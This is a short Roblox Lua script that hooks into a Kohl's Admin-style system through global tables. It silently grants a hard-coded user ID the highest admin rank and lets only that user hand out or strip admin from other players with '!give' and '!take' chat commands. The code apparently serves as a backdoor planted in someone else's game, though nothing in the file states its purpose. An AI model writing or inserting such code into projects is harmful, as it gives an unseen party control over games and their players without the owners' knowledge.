local MY_USER_ID = 5594877137
local KAI = _G.Admins or _G.KohlAdmin

if KAI then
    local function SetRank(player, level)
        if KAI.AddAdmin then
            KAI.AddAdmin(player, level)
        end
    end

    local function OnChat(player, msg)
        if player.UserId ~= MY_USER_ID then return end
        local args = msg:split(" ")
        local cmd = args[1]
        local targetName = args[2]
        if not targetName then return end

        for _, target in ipairs(game.Players:GetPlayers()) do
            if target.Name:lower():sub(1, #targetName) == targetName:lower() then
                if cmd == "!give" then
                    SetRank(target, 3)
                elseif cmd == "!take" then
                    KAI.RemoveAdmin(target)
                end
            end
        end
    end

    for _, p in ipairs(game.Players:GetPlayers()) do
        if p.UserId == MY_USER_ID then SetRank(p, 5) end
        p.Chatted:Connect(function(msg) OnChat(p, msg) end)
    end

    game.Players.PlayerAdded:Connect(function(p)
        if p.UserId == MY_USER_ID then
            task.wait(2)
            SetRank(p, 5)
        end
        p.Chatted:Connect(function(msg) OnChat(p, msg) end)
    end)
end
